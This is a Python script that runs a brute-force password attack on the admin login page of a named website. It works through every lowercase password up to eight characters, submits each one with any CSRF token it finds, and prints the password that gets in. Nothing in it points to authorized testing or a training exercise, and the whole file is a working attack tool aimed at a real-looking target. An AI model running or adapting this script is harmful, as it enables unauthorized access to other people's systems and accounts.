import itertools
import string
import requests
from bs4 import BeautifulSoup

login_url = 'https://sbyono.in/admin'

# Start a session
session = requests.Session()

# Make an initial GET request to get any cookies or tokens
response = session.get(login_url)
if not response.ok:
    print('Failed to access the login page.')
    print('Response content:', response.text)
    exit()

# Function to generate and test passwords
def generate_and_test_passwords(response, max_length):
    # Define the characters that can be used in the password (only lowercase letters)
    characters = string.ascii_lowercase
    
    # Parse the login page for hidden fields or CSRF tokens
    soup = BeautifulSoup(response.text, 'html.parser')
    
    # Example: Get CSRF token if present
    csrf_token = soup.find('input', {'name': 'csrf_token'})
    
    # Generate passwords
    for length in range(max_length + 1):
        for password_tuple in itertools.product(characters, repeat=length):
            password = ''.join(password_tuple)
            
            # Prepare payload
            if csrf_token:
                csrf_token_value = csrf_token.get('value')
                payload = {
                    'username': 'admin',
                    'password': password,
                    'csrf_token': csrf_token_value
                }
            else:
                payload = {
                    'username': 'admin',
                    'password': password
                }
            
            # Attempt login
            login_response = session.post(login_url, data=payload)
            
            if login_response.ok:
                # Check for login success
                if "User Or Password Wronge.." not in login_response.text:
                    print(f'Successful login with password: {password}')
                    break
                    return
                else:
                    print(f'Failed login attempt with password: {password}')
            else:
                print(f'Error during login attempt with password: {password}')
    
    print('All attempts finished.')

# Define the maximum length of the password
max_length = 8

# Generate and test passwords up to the maximum length
generate_and_test_passwords(response, max_length)
